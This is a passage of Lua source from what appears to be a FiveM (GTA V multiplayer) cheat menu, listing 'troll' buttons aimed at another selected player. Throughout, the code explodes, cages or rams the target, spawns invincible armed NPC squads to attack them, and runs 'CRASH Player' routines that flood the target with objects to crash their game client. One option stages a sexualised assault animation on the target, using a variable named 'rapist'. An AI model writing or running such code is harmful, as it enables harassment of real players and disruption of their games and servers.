              if IsPedInAnyVehicle(GetPlayerPed(SelectedPlayer), true) then
                AddExplosion(GetEntityCoords(GetPlayerPed(SelectedPlayer)), 4, 1337.0, false, true, 0.0)
              else
                notify("~b~Player not in a vehicle~s~.", false)
              end
            elseif EVP.Button("~y~Delete ~s~Vehicle") then
              if IsPedInAnyVehicle(GetPlayerPed(SelectedPlayer), true) then
                local veh = GetVehiclePedIsIn(GetPlayerPed(SelectedPlayer), false)
                ClearPedTasksImmediately(GetPlayerPed(SelectedPlayer))
                SetVehicleHasBeenOwnedByPlayer(veh,false)
                Citizen.InvokeNative(0xAD738C3085FE7E11, veh, false, true) -- set not as mission entity
                SetVehicleAsNoLongerNeeded(Citizen.PointerValueIntInitialized(veh))
                Citizen.InvokeNative(0xEA386986E786A54F, Citizen.PointerValueIntInitialized(veh))
              end
            elseif EVP.Button("~p~Fuck ~s~Vehicle") then
              if IsPedInAnyVehicle(GetPlayerPed(SelectedPlayer), true) then
                local playerVeh = GetVehiclePedIsIn(GetPlayerPed(SelectedPlayer), true)
                ClearPedTasksImmediately(GetPlayerPed(SelectedPlayer))
                doshit(playerVeh)
              end
            elseif EVP.Button("~r~Banana ~p~Party ~y~v2") then
              local pisello = CreateObject(-1207431159, 0, 0, 0, true, true, true)
              local pisello2 = CreateObject(GetHashKey("cargoplane"), 0, 0, 0, true, true, true)
              local pisello3 = CreateObject(GetHashKey("prop_beach_fire"), 0, 0, 0, true, true, true)
              AttachEntityToEntity(pisello, GetPlayerPed(SelectedPlayer), GetPedBoneIndex(GetPlayerPed(SelectedPlayer), 57005), 0.4, 0, 0, 0, 270.0, 60.0, true, true, false, true, 1, true)
              AttachEntityToEntity(pisello2, GetPlayerPed(SelectedPlayer), GetPedBoneIndex(GetPlayerPed(SelectedPlayer), 57005), 0.4, 0, 0, 0, 270.0, 60.0, true, true, false, true, 1, true)
              AttachEntityToEntity(pisello3, GetPlayerPed(SelectedPlayer), GetPedBoneIndex(GetPlayerPed(SelectedPlayer), 57005), 0.4, 0, 0, 0, 270.0, 60.0, true, true, false, true, 1, true)
            elseif EVP.Button("~r~Explode ~s~Player") then
              AddExplosion(GetEntityCoords(GetPlayerPed(SelectedPlayer)), 5, 3000.0, true, false, 100000.0)
              AddExplosion(GetEntityCoords(GetPlayerPed(SelectedPlayer)), 5, 3000.0, true, false, true)
            elseif EVP.Button("~r~Composer Devil ~s~Player") then
              RequestModelSync("a_m_o_acult_01")
              RequestAnimDict("rcmpaparazzo_2")
              while not HasAnimDictLoaded("rcmpaparazzo_2") do
                Citizen.Wait(0)
              end

              if IsPedInAnyVehicle(GetPlayerPed(SelectedPlayer), true) then
                local veh = GetVehiclePedIsIn(GetPlayerPed(SelectedPlayer), true)
                while not NetworkHasControlOfEntity(veh) do
                  NetworkRequestControlOfEntity(veh)
                  Citizen.Wait(0)
                end
                SetEntityAsMissionEntity(veh, true, true)
                DeleteVehicle(veh)
                DeleteEntity(veh)
              end
              count = -0.2
              for b=1,3 do
                local x,y,z = table.unpack(GetEntityCoords(GetPlayerPed(SelectedPlayer), true))
                local rapist = CreatePed(4, GetHashKey("a_m_o_acult_01"), x,y,z, 0.0, true, false)
                SetEntityAsMissionEntity(rapist, true, true)
                AttachEntityToEntity(rapist, GetPlayerPed(SelectedPlayer), 4103, 11816, count, 0.00, 0.0, 0.0, 0.0, 0.0, false, false, false, false, 2, true)
                ClearPedTasks(GetPlayerPed(SelectedPlayer))
                TaskPlayAnim(GetPlayerPed(SelectedPlayer), "rcmpaparazzo_2", "shag_loop_poppy", 2.0, 2.5, -1, 49, 0, 0, 0, 0)
                SetPedKeepTask(rapist)
                TaskPlayAnim(rapist, "rcmpaparazzo_2", "shag_loop_a", 2.0, 2.5, -1, 49, 0, 0, 0, 0)
                SetEntityInvincible(rapist, true)
                count = count - 0.4
              end
            elseif EVP.Button("~r~Cage ~s~Player") then
              x, y, z = table.unpack(GetEntityCoords(GetPlayerPed(SelectedPlayer)))
              roundx = tonumber(string.format("%.2f", x))
              roundy = tonumber(string.format("%.2f", y))
              roundz = tonumber(string.format("%.2f", z))
              local cagemodel = "prop_fnclink_05crnr1"
              local cagehash = GetHashKey(cagemodel)
              RequestModel(cagehash)
              while not HasModelLoaded(cagehash) do
                Citizen.Wait(0)
              end
              local cage1 = CreateObject(cagehash, roundx - 1.70, roundy - 1.70, roundz - 1.0, true, true, false)
              local cage2 = CreateObject(cagehash, roundx + 1.70, roundy + 1.70, roundz - 1.0, true, true, false)
              SetEntityHeading(cage1, -90.0)
              SetEntityHeading(cage2, 90.0)
              FreezeEntityPosition(cage1, true)
              FreezeEntityPosition(cage2, true)


            elseif EVP.Button("~r~Ram with Futo") then
              local model = GetHashKey("futo")
              RequestModel(model)
              while not HasModelLoaded(model) do
                Citizen.Wait(0)
              end
              local offset = GetOffsetFromEntityInWorldCoords(GetPlayerPed(SelectedPlayer), 0, -10.0, 0)
              if HasModelLoaded(model) then
                local veh = CreateVehicle(model, offset.x, offset.y, offset.z, GetEntityHeading(GetPlayerPed(SelectedPlayer)), true, true)
                SetVehicleForwardSpeed(veh, 120.0)
              end
            elseif EVP.Button("~r~Ram with Bus") then
              local model = GetHashKey("bus")
              RequestModel(model)
              while not HasModelLoaded(model) do
                Citizen.Wait(0)
              end
              local offset = GetOffsetFromEntityInWorldCoords(GetPlayerPed(SelectedPlayer), 0, -10.0, 0)
              if HasModelLoaded(model) then
                local veh = CreateVehicle(model, offset.x, offset.y, offset.z, GetEntityHeading(GetPlayerPed(SelectedPlayer)), true, true)
                SetVehicleForwardSpeed(veh, 120.0)
              end

            elseif EVP.Button('Follow ~r~Player') then
              if Follow == false then
                Follow = true
                notify('This is a button toggle, click again to disable')
              elseif Follow == true then
                Follow = false
                notify('This is a button toggle, click again to enable')
              end
            elseif EVP.Button("~r~Hamburgher ~s~Player") then
              local hamburg = "xs_prop_hamburgher_wl"
              local hamburghash = GetHashKey(hamburg)
              local hamburger = CreateObject(hamburghash, 0, 0, 0, true, true, true)
              AttachEntityToEntity(hamburger, GetPlayerPed(SelectedPlayer), GetPedBoneIndex(GetPlayerPed(SelectedPlayer), 0), 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true)
            elseif EVP.Button("~r~Hamburgher ~s~Player Car") then
              local hamburg = "xs_prop_hamburgher_wl"
              local hamburghash = GetHashKey(hamburg)
              local hamburger = CreateObject(hamburghash, 0, 0, 0, true, true, true)
              AttachEntityToEntity(hamburger, GetVehiclePedIsIn(GetPlayerPed(SelectedPlayer), false), GetEntityBoneIndexByName(GetVehiclePedIsIn(GetPlayerPed(SelectedPlayer), false), "chassis"), 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true)
            elseif EVP.Button('~r~Attempt Crash') then
              if IsPedInAnyVehicle(GetVehiclePedIsIn(SelectedPlayer, 1), false) then
                ClearPedTasksImmediately(SelectedPlayer)
              end
              notify(SelectedPlayer .. ' Crash Attempt')
              for i = 0, 64 do
                if IsPedInAnyVehicle(GetVehiclePedIsIn(SelectedPlayer, 1), false) then
                  ClearPedTasksImmediately(SelectedPlayer)
                end
                local coords = GetEntityCoords(GetPlayerPed(SelectedPlayer))
                RequestModel(GetHashKey('s_m_y_swat_01'))
                RequestModel(GetHashKey('ig_wade'))
                Citizen.Wait(50)
                if HasModelLoaded(GetHashKey('s_m_y_swat_01')) then
                  local ped =
                  CreatePed(21, GetHashKey('s_m_y_swat_01'), coords.x, coords.y, coords.z, 0, true, false)
                  local ped1 =
                  CreatePed(21, GetHashKey('ig_wade'), coords.x, coords.y, coords.z, 0, true, false)
                  if DoesEntityExist(ped) and DoesEntityExist(ped1) then
                    RequestNetworkControl(ped)
                    RequestNetworkControl(ped1)
                    GiveWeaponToPed(ped, GetHashKey('WEAPON_ASSAULTRIFLE'), 9999, 1, 1)
                    GiveWeaponToPed(ped1, GetHashKey('WEAPON_RPG'), 9999, 1, 1)
                    SetPedCanSwitchWeapon(ped, true)
                    SetPedCanSwitchWeapon(ped1, true)
                    makePedHostile(ped, SelectedPlayer, 0, 0)
                    makePedHostile(ped1, SelectedPlayer, 0, 0)
                    TaskCombatPed(ped, GetPlayerPed(SelectedPlayer), 0, 16)
                    TaskCombatPed(ped1, GetPlayerPed(SelectedPlayer), 0, 16)
                  elseif IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                    TaskCombatHatedTargetsInArea(ped, coords.x, coords.y, coords.z, 500)
                    TaskCombatHatedTargetsInArea(ped1, coords.x, coords.y, coords.z, 500)
                  else
                    Citizen.Wait(0)
                  end
                else
                  Citizen.Wait(0)
                end
              end
            elseif EVP.Button('~o~_!_ ~r~CRASH ~s~Player ~o~_!_') then
              local ej = GetEntityCoords(GetPlayerPed(SelectedPlayer))
              local ek = {
                0x9CF21E0F,
                0x34315488,
                0x6A27FEB1,
                0xCB2ACC8,
                0xC6899CDE,
                0xD14B5BA3,
                0xD9F4474C,
                0x32A9996C,
                0x69D4F974,
                0xCAFC1EC3,
                0x79B41171,
                0x1075651,
                0xC07792D4,
                0x781E451D,
                0x762657C6,
                0xC2E75A21,
                0xC3C00861,
                0x81FB3FF0,
                0x45EF7804,
                0xE65EC0E4,
                0xE764D794,
                0xFBF7D21F,
                0xE1AEB708,
                0xA5E3D471,
                0xD971BBAE,
                0xCF7A9A9D,
                0xC2CC99D8,
                0x8FB233A4,
                0x24E08E1F,
                0x337B2B54,
                0xB9402F87,
                0x4F2526DA
              }
              for i = 1, #ek do
                local a = CreateObject(ek[i], ej, true, true, true)
              end
              end
              EVP.Display()
          elseif EVP.IsMenuOpened(SPD) then -- ped troll
            drawDescription("~r~Troll ~s~player with peds", 0.80, 0.9)
            if EVP.Button("~r~Segmentation") then
              for clone = 0, 10 do
                ClonePed(SelectedPlayer)
              end
            elseif EVP.Button("~r~Snowball troll ~s~Player") then
              rotatier = true
              x, y, z = table.unpack(GetEntityCoords(GetPlayerPed(SelectedPlayer)))
              roundx = tonumber(string.format("%.2f", x))
              roundy = tonumber(string.format("%.2f", y))
              roundz = tonumber(string.format("%.2f", z))
              local tubemodel = "sr_prop_spec_tube_xxs_01a"
              local tubehash = GetHashKey(tubemodel)
              RequestModel(tubehash)
              RequestModel(smashhash)
              while not HasModelLoaded(tubehash) do
                Citizen.Wait(0)
              end
              local tube = CreateObject(tubehash, roundx, roundy, roundz - 5.0, true, true, false)
              SetEntityRotation(tube, 0.0, 90.0, 0.0)
              local snowhash = -356333586
              local wep = "WEAPON_SNOWBALL"
              for i = 0, 10 do
                local coords = GetEntityCoords(tube)
                RequestModel(snowhash)
                Citizen.Wait(50)
                if HasModelLoaded(snowhash) then
                  local ped = CreatePed(21, snowhash, coords.x + math.sin(i * 2.0), coords.y - math.sin(i * 2.0), coords.z - 5.0, 0, true, true) and CreatePed(21, snowhash ,coords.x - math.sin(i * 2.0), coords.y + math.sin(i * 2.0), coords.z - 5.0, 0, true, true)
                  NetworkRegisterEntityAsNetworked(ped)
                  if DoesEntityExist(ped) and
                  not IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                    local netped = PedToNet(ped)
                    NetworkSetNetworkIdDynamic(netped, false)
                    SetNetworkIdCanMigrate(netped, true)
                    SetNetworkIdExistsOnAllMachines(netped, true)
                    Citizen.Wait(500)
                    NetToPed(netped)
                    GiveWeaponToPed(ped,GetHashKey(wep), 9999, 1, 1)
                    SetCurrentPedWeapon(ped, GetHashKey(wep), true)
                    SetEntityInvincible(ped, true)
                    SetPedCanSwitchWeapon(ped, true)
                    TaskCombatPed(ped, GetPlayerPed(SelectedPlayer), 0,16)
                  elseif IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                    TaskCombatHatedTargetsInArea(ped, coords.x,coords.y, coords.z, 500)
                  else
                    Citizen.Wait(0)
                  end
                end
              end
            elseif EVP.Button("~r~Spawn ~s~Swat army with ~y~AK") then
              local pedname = "s_m_y_swat_01"
              local wep = "WEAPON_ASSAULTRIFLE"
              for i = 0, 10 do
                local coords = GetEntityCoords(GetPlayerPed(SelectedPlayer))
                RequestModel(GetHashKey(pedname))
                Citizen.Wait(50)
                if HasModelLoaded(GetHashKey(pedname)) then
                  local ped = CreatePed(21, GetHashKey(pedname),coords.x + i, coords.y - i, coords.z, 0, true, true) and CreatePed(21, GetHashKey(pedname),coords.x - i, coords.y + i, coords.z, 0, true, true)
                  NetworkRegisterEntityAsNetworked(ped)
                  if DoesEntityExist(ped) and
                  not IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                    local netped = PedToNet(ped)
                    NetworkSetNetworkIdDynamic(netped, false)
                    SetNetworkIdCanMigrate(netped, true)
                    SetNetworkIdExistsOnAllMachines(netped, true)
                    Citizen.Wait(500)
                    NetToPed(netped)
                    GiveWeaponToPed(ped,GetHashKey(wep), 9999, 1, 1)
                    SetEntityInvincible(ped, true)
                    SetPedCanSwitchWeapon(ped, true)
                    TaskCombatPed(ped, GetPlayerPed(SelectedPlayer), 0,16)
                  elseif IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                    TaskCombatHatedTargetsInArea(ped, coords.x,coords.y, coords.z, 500)
                  else
                    Citizen.Wait(0)
                  end
                end
              end
            elseif EVP.Button("~r~Spawn ~s~Swat army with ~y~RPG") then
              local pedname = "s_m_y_swat_01"
              local wep = "weapon_rpg"
              for i = 0, 10 do
                local coords = GetEntityCoords(GetPlayerPed(SelectedPlayer))
                RequestModel(GetHashKey(pedname))
                Citizen.Wait(50)
                if HasModelLoaded(GetHashKey(pedname)) then
                  local ped = CreatePed(21, GetHashKey(pedname),coords.x + i, coords.y - i, coords.z, 0, true, true) and CreatePed(21, GetHashKey(pedname),coords.x - i, coords.y + i, coords.z, 0, true, true)
                  NetworkRegisterEntityAsNetworked(ped)
                  if DoesEntityExist(ped) and
                  not IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                    local netped = PedToNet(ped)
                    NetworkSetNetworkIdDynamic(netped, false)
                    SetNetworkIdCanMigrate(netped, true)
                    SetNetworkIdExistsOnAllMachines(netped, true)
                    Citizen.Wait(500)
                    NetToPed(netped)
                    GiveWeaponToPed(ped,GetHashKey(wep), 9999, 1, 1)
                    SetEntityInvincible(ped, true)
                    SetPedCanSwitchWeapon(ped, true)
                    TaskCombatPed(ped, GetPlayerPed(SelectedPlayer), 0,16)
                  elseif IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                    TaskCombatHatedTargetsInArea(ped, coords.x,coords.y, coords.z, 500)
                  else
                    Citizen.Wait(0)
                  end
                end
              end
            elseif EVP.Button("~r~Spawn ~s~Swat army with ~y~Flaregun") then
              local pedname = "s_m_y_swat_01"
              local wep = "weapon_flaregun"
              for i = 0, 10 do
                local coords = GetEntityCoords(GetPlayerPed(SelectedPlayer))
                RequestModel(GetHashKey(pedname))
                Citizen.Wait(50)
                if HasModelLoaded(GetHashKey(pedname)) then
                  local ped = CreatePed(21, GetHashKey(pedname),coords.x + i, coords.y - i, coords.z, 0, true, true) and CreatePed(21, GetHashKey(pedname),coords.x - i, coords.y + i, coords.z, 0, true, true)
                  NetworkRegisterEntityAsNetworked(ped)
                  if DoesEntityExist(ped) and
                  not IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                    local netped = PedToNet(ped)
                    NetworkSetNetworkIdDynamic(netped, false)
                    SetNetworkIdCanMigrate(netped, true)
                    SetNetworkIdExistsOnAllMachines(netped, true)
                    Citizen.Wait(500)
                    NetToPed(netped)
                    GiveWeaponToPed(ped,GetHashKey(wep), 9999, 1, 1)
                    SetEntityInvincible(ped, true)
                    SetPedCanSwitchWeapon(ped, true)
                    TaskCombatPed(ped, GetPlayerPed(SelectedPlayer), 0,16)
                  elseif IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                    TaskCombatHatedTargetsInArea(ped, coords.x,coords.y, coords.z, 500)
                  else
                    Citizen.Wait(0)
                  end
                end
              end
            elseif EVP.Button("~r~Spawn ~s~Swat army with ~y~Railgun") then
              local pedname = "s_m_y_swat_01"
              local wep = "weapon_railgun"
              for i = 0, 10 do
                local coords = GetEntityCoords(GetPlayerPed(SelectedPlayer))
                RequestModel(GetHashKey(pedname))
                Citizen.Wait(50)
                if HasModelLoaded(GetHashKey(pedname)) then
                  local ped = CreatePed(21, GetHashKey(pedname),coords.x + i, coords.y - i, coords.z, 0, true, true) and CreatePed(21, GetHashKey(pedname),coords.x - i, coords.y + i, coords.z, 0, true, true)
                  NetworkRegisterEntityAsNetworked(ped)
                  if DoesEntityExist(ped) and
                  not IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                    local netped = PedToNet(ped)
                    NetworkSetNetworkIdDynamic(netped, false)
                    SetNetworkIdCanMigrate(netped, true)
                    SetNetworkIdExistsOnAllMachines(netped, true)
                    Citizen.Wait(500)
                    NetToPed(netped)
                    GiveWeaponToPed(ped,GetHashKey(wep), 9999, 1, 1)
                    SetEntityInvincible(ped, true)
                    SetPedCanSwitchWeapon(ped, true)
                    TaskCombatPed(ped, GetPlayerPed(SelectedPlayer), 0,16)
                  elseif IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                    TaskCombatHatedTargetsInArea(ped, coords.x,coords.y, coords.z, 500)
                  else
                    Citizen.Wait(0)
                  end
                end
              end
            elseif EVP.Button('Spawn Driveby') then
              local vehlist = {'Nero', 'Deluxo', 'Raiden', 'Bati2', "SultanRS", "TA21", "Lynx", "ZR380", "Streiter", "Neon", "Italigto", "Nero2", "Fmj", "le7b", "prototipo", "cyclone", "khanjali", "STROMBERG", "BARRAGE", "COMET5"}
              local veh = vehlist[math.random(#vehlist)]
              for i = 0, 1 do
                local pos = GetEntityCoords(GetPlayerPed(SelectedPlayer))
                local pitch = GetEntityPitch(GetPlayerPed(SelectedPlayer))
                local roll = GetEntityRoll(GetPlayerPed(SelectedPlayer))
                local yaw = GetEntityRotation(GetPlayerPed(SelectedPlayer)).z
                local xf = GetEntityForwardX(GetPlayerPed(SelectedPlayer))
                local yf = GetEntityForwardY(GetPlayerPed(SelectedPlayer))
                if IsPedInAnyVehicle(GetPlayerPed(SelectedPlayer), false) then
                  local vt = GetVehiclePedIsIn(GetPlayerPed(SelectedPlayer), 0)
                  NetworkRequestControlOfEntity(vt)
                  SetVehicleModKit(vt, 0)
                  ToggleVehicleMod(vt, 20, 1)
                  SetVehicleModKit(vt, 0)
                  SetVehicleTyresCanBurst(vt, 1)
                end
                local v = nil
                RequestModel(veh)
                RequestModel('s_m_y_swat_01')
                while not HasModelLoaded(veh) and not HasModelLoaded('s_m_y_swat_01') do
                  RequestModel('s_m_y_swat_01')
                  Citizen.Wait(0)
                  RequestModel(veh)
                end
                if HasModelLoaded(veh) then
                  Citizen.Wait(50)
                  v =
                  CreateVehicle(
                  veh,
                  pos.x - (xf * 10),
                  pos.y - (yf * 10),
                  pos.z + 1,
                  GetEntityHeading(GetPlayerPed(-1)),
                  1,
                  1
                  )
                  SetEntityInvincible(v, true)
                  if DoesEntityExist(v) then
                    NetworkRequestControlOfEntity(v)
                    SetVehicleDoorsLocked(v, 4)
                    RequestModel('s_m_y_swat_01')
                    Citizen.Wait(50)
                    if HasModelLoaded('s_m_y_swat_01') then
                      Citizen.Wait(50)
                      local ped = CreatePed(21, GetHashKey('s_m_y_swat_01'), pos.x, pos.y, pos.z, true, false)
                      local ped1 =
                      CreatePed(21, GetHashKey('s_m_y_swat_01'), pos.x, pos.y, pos.z, true, false)
                      if DoesEntityExist(ped1) and DoesEntityExist(ped) then
                        GiveWeaponToPed(ped, GetHashKey('WEAPON_APPISTOL'), 9999, 1, 1)
                        GiveWeaponToPed(ped1, GetHashKey('WEAPON_APPISTOL'), 9999, 1, 1)
                        SetPedIntoVehicle(ped, v, -1)
                        SetPedIntoVehicle(ped1, v, 0)
                        TaskDriveBy(
                        ped,
                        GetVehiclePedIsUsing(GetPlayerPed(SelectedPlayer)),
                        pos.x,
                        pos.y,
                        pos.z,
                        200,
                        99,
                        0,
                        'FIRING_PATTERN_BURST_FIRE_DRIVEBY'
                        )
                        TaskShootAtEntity(
                        ped1,
                        GetVehiclePedIsUsing(GetPlayerPed(SelectedPlayer)),
                        200,
                        'FIRING_PATTERN_BURST_FIRE_DRIVEBY'
                        )
                        makePedHostile(ped, SelectedPlayer, 0, 0)
                        makePedHostile(ped1, SelectedPlayer, 0, 0)
                        TaskCombatPed(ped, GetPlayerPed(SelectedPlayer), 0, 16)
                        TaskCombatPed(ped1, GetPlayerPed(SelectedPlayer), 0, 16)
                        SetPlayerWeaponDamageModifier(ped, 500)
                        SetPlayerWeaponDamageModifier(ped1, 500)
                        for i = 1, 2 do
                          Citizen.Wait(5)
                          ClearPedTasks(GetPlayerPed(-1))
                        end
                      end
                    end
                  end
                end
              end
            elseif EVP.Button('Spawn Swat in car ~r~Attack') then
              local vehlist = {"FBI2", "FBI"}
              local veh = vehlist[math.random(#vehlist)]
              for i = 0, 1 do
                local pos = GetEntityCoords(GetPlayerPed(SelectedPlayer))
                local pitch = GetEntityPitch(GetPlayerPed(SelectedPlayer))
                local roll = GetEntityRoll(GetPlayerPed(SelectedPlayer))
                local yaw = GetEntityRotation(GetPlayerPed(SelectedPlayer)).z
                local xf = GetEntityForwardX(GetPlayerPed(SelectedPlayer))
                local yf = GetEntityForwardY(GetPlayerPed(SelectedPlayer))
                if IsPedInAnyVehicle(GetPlayerPed(SelectedPlayer), false) then
                  local vt = GetVehiclePedIsIn(GetPlayerPed(SelectedPlayer), 0)
                  NetworkRequestControlOfEntity(vt)
                  SetVehicleModKit(vt, 0)
                  ToggleVehicleMod(vt, 20, 1)
                  SetVehicleModKit(vt, 0)
                  SetVehicleTyresCanBurst(vt, 1)
                end
                local v = nil
                RequestModel(veh)
                RequestModel('s_m_y_swat_01')
                while not HasModelLoaded(veh) and not HasModelLoaded('s_m_y_swat_01') do
                  RequestModel('s_m_y_swat_01')
                  Citizen.Wait(0)
                  RequestModel(veh)
                end
                if HasModelLoaded(veh) then
                  Citizen.Wait(50)
                  v =
                  CreateVehicle(
                  veh,
                  pos.x - (xf * 30),
                  pos.y - (yf * 30),
                  pos.z + 1,
                  GetEntityHeading(GetPlayerPed(SelectedPlayer)),
                  true,
                  false
                  )
                  if DoesEntityExist(v) then
                    NetworkRequestControlOfEntity(v)
                    SetVehicleDoorsLocked(v, 4)
                    RequestModel('s_m_y_swat_01')
                    Citizen.Wait(50)
                    if HasModelLoaded('s_m_y_swat_01') then
                      Citizen.Wait(50)
                      local ped = CreatePed(21, GetHashKey('s_m_y_swat_01'), pos.x, pos.y, pos.z, true, true)
                      local ped1 =
                      CreatePed(21, GetHashKey('s_m_y_swat_01'), pos.x, pos.y, pos.z, true, true)
                      if DoesEntityExist(ped1) and DoesEntityExist(ped) then
                        GiveWeaponToPed(ped, GetHashKey('WEAPON_APPISTOL'), 9999, 1, 1)
                        GiveWeaponToPed(ped1, GetHashKey('WEAPON_APPISTOL'), 9999, 1, 1)
                        SetPedIntoVehicle(ped, v, -1)
                        SetPedIntoVehicle(ped1, v, 0)
                        TaskDriveBy(
                        ped,
                        GetVehiclePedIsUsing(GetPlayerPed(SelectedPlayer)),
                        pos.x,
                        pos.y,
                        pos.z,
                        200,
                        99,
                        0,
                        'FIRING_PATTERN_BURST_FIRE_DRIVEBY'
                        )
                        TaskShootAtEntity(
                        ped1,
                        GetVehiclePedIsUsing(GetPlayerPed(SelectedPlayer)),
                        200,
                        'FIRING_PATTERN_BURST_FIRE_DRIVEBY'
                        )
                        makePedHostile(ped, SelectedPlayer, 0, 0)
                        makePedHostile(ped1, SelectedPlayer, 0, 0)
                        TaskCombatPed(ped, GetPlayerPed(SelectedPlayer), 0, 16)
                        TaskCombatPed(ped1, GetPlayerPed(SelectedPlayer), 0, 16)
                        for i = 1, 2 do
                          Citizen.Wait(5)
                          ClearPedTasks(GetPlayerPed(-1))
                        end
                      end
                    end
                  end
                end
              end
            elseif EVP.Button('Spawn Marines in car ~r~Attack') then
              local vehlist = {"Mesa3", "BARRAGE", "khanjali"}
              local veh = vehlist[math.random(#vehlist)]
              for i = 0, 1 do
                local pos = GetEntityCoords(GetPlayerPed(SelectedPlayer))
                local pitch = GetEntityPitch(GetPlayerPed(SelectedPlayer))
                local roll = GetEntityRoll(GetPlayerPed(SelectedPlayer))
                local yaw = GetEntityRotation(GetPlayerPed(SelectedPlayer)).z
                local xf = GetEntityForwardX(GetPlayerPed(SelectedPlayer))
                local yf = GetEntityForwardY(GetPlayerPed(SelectedPlayer))
                if IsPedInAnyVehicle(GetPlayerPed(SelectedPlayer), false) then
                  local vt = GetVehiclePedIsIn(GetPlayerPed(SelectedPlayer), 0)
                  NetworkRequestControlOfEntity(vt)
                  SetVehicleModKit(vt, 0)
                  ToggleVehicleMod(vt, 20, 1)
                  SetVehicleModKit(vt, 0)
                  SetVehicleTyresCanBurst(vt, 1)
                end
                local v = nil
                RequestModel(veh)
                RequestModel('S_M_Y_Marine_03')
                while not HasModelLoaded(veh) and not HasModelLoaded('S_M_Y_Marine_03') do
                  RequestModel('S_M_Y_Marine_03')
                  Citizen.Wait(0)
                  RequestModel(veh)
                end
                if HasModelLoaded(veh) then
                  Citizen.Wait(50)
                  v =
                  CreateVehicle(
                  veh,
                  pos.x - (xf * 30),
                  pos.y - (yf * 30),
                  pos.z + 1,
                  GetEntityHeading(GetPlayerPed(SelectedPlayer)),
                  true,
                  false
                  )
                  if DoesEntityExist(v) then
                    NetworkRequestControlOfEntity(v)
                    SetVehicleDoorsLocked(v, 4)
                    RequestModel('S_M_Y_Marine_03')
                    Citizen.Wait(50)
                    if HasModelLoaded('S_M_Y_Marine_03') then
                      Citizen.Wait(50)
                      local ped = CreatePed(21, GetHashKey('S_M_Y_Marine_03'), pos.x, pos.y, pos.z, true, true)
                      local ped1 =
                      CreatePed(26, GetHashKey('S_M_Y_Marine_03'), pos.x, pos.y, pos.z, true, true)
                      if DoesEntityExist(ped1) and DoesEntityExist(ped) then
                        GiveWeaponToPed(ped, GetHashKey('WEAPON_MICROSMG'), 9999, 1, 1)
                        GiveWeaponToPed(ped1, GetHashKey('WEAPON_MACHINEPISTOL'), 9999, 1, 1)
                        SetPedIntoVehicle(ped, v, -1)
                        SetPedIntoVehicle(ped1, v, 0)
                        TaskDriveBy(
                        ped,
                        GetVehiclePedIsUsing(GetPlayerPed(SelectedPlayer)),
                        pos.x,
                        pos.y,
                        pos.z,
                        200,
                        99,
                        0,
                        'FIRING_PATTERN_BURST_FIRE_DRIVEBY'
                        )
                        TaskShootAtEntity(
                        ped1,
                        GetVehiclePedIsUsing(GetPlayerPed(SelectedPlayer)),
                        200,
                        'FIRING_PATTERN_BURST_FIRE_DRIVEBY'
                        )
                        makePedHostile(ped, SelectedPlayer, 0, 0)
                        makePedHostile(ped1, SelectedPlayer, 0, 0)
                        TaskCombatPed(ped, GetPlayerPed(SelectedPlayer), 0, 16)
                        TaskCombatPed(ped1, GetPlayerPed(SelectedPlayer), 0, 16)
                        for i = 1, 2 do
                          Citizen.Wait(5)
                          ClearPedTasks(GetPlayerPed(-1))
                        end
                      end
                    end
                  end
                end
              end
            elseif EVP.Button('Spawn Italian Mafia in car ~r~Attack') then
              local vehlist = {"Italigtb2", "Italigtb", "Prototipo", "Osiris", "T20", "Turismo2", "Zentorno", "Nero2", "Cheetah"}
              local veh = vehlist[math.random(#vehlist)]
              for i = 0, 1 do
                local pos = GetEntityCoords(GetPlayerPed(SelectedPlayer))
                local pitch = GetEntityPitch(GetPlayerPed(SelectedPlayer))
                local roll = GetEntityRoll(GetPlayerPed(SelectedPlayer))
                local yaw = GetEntityRotation(GetPlayerPed(SelectedPlayer)).z
                local xf = GetEntityForwardX(GetPlayerPed(SelectedPlayer))
                local yf = GetEntityForwardY(GetPlayerPed(SelectedPlayer))
                if IsPedInAnyVehicle(GetPlayerPed(SelectedPlayer), false) then
                  local vt = GetVehiclePedIsIn(GetPlayerPed(SelectedPlayer), 0)
                  NetworkRequestControlOfEntity(vt)
                  SetVehicleModKit(vt, 0)
                  ToggleVehicleMod(vt, 20, 1)
                  SetVehicleModKit(vt, 0)
                  SetVehicleTyresCanBurst(vt, 1)
                end
                local v = nil
                RequestModel(veh)
                RequestModel('CS_MovPremMale')
                while not HasModelLoaded(veh) and not HasModelLoaded('CS_MovPremMale') do
                  RequestModel('CS_MovPremMale')
                  Citizen.Wait(0)
                  RequestModel(veh)
                end
                if HasModelLoaded(veh) then
                  Citizen.Wait(50)
                  v =
                  CreateVehicle(
                  veh,
                  pos.x - (xf * 30),
                  pos.y - (yf * 30),
                  pos.z + 1,
                  GetEntityHeading(GetPlayerPed(SelectedPlayer)),
                  true,
                  false
                  )
                  if DoesEntityExist(v) then
                    NetworkRequestControlOfEntity(v)
                    SetVehicleDoorsLocked(v, 4)
                    RequestModel('CS_MovPremMale')
                    Citizen.Wait(50)
                    if HasModelLoaded('CS_MovPremMale') then
                      Citizen.Wait(50)
                      local ped = CreatePed(21, GetHashKey('CS_MovPremMale'), pos.x, pos.y, pos.z, true, true)
                      local ped1 =
                      CreatePed(21, GetHashKey('CS_MovPremMale'), pos.x, pos.y, pos.z, true, true)
                      if DoesEntityExist(ped1) and DoesEntityExist(ped) then
                        GiveWeaponToPed(ped, GetHashKey('WEAPON_REVOLVER'), 9999, 1, 1)
                        GiveWeaponToPed(ped1, GetHashKey('WEAPON_COMPACTRIFLE'), 9999, 1, 1)
                        SetPedIntoVehicle(ped, v, -1)
                        SetPedIntoVehicle(ped1, v, 0)
                        TaskDriveBy(
                        ped,
                        GetVehiclePedIsUsing(GetPlayerPed(SelectedPlayer)),
                        pos.x,
                        pos.y,
                        pos.z,
                        200,
                        99,
                        0,
                        'FIRING_PATTERN_BURST_FIRE_DRIVEBY'
                        )
                        TaskShootAtEntity(
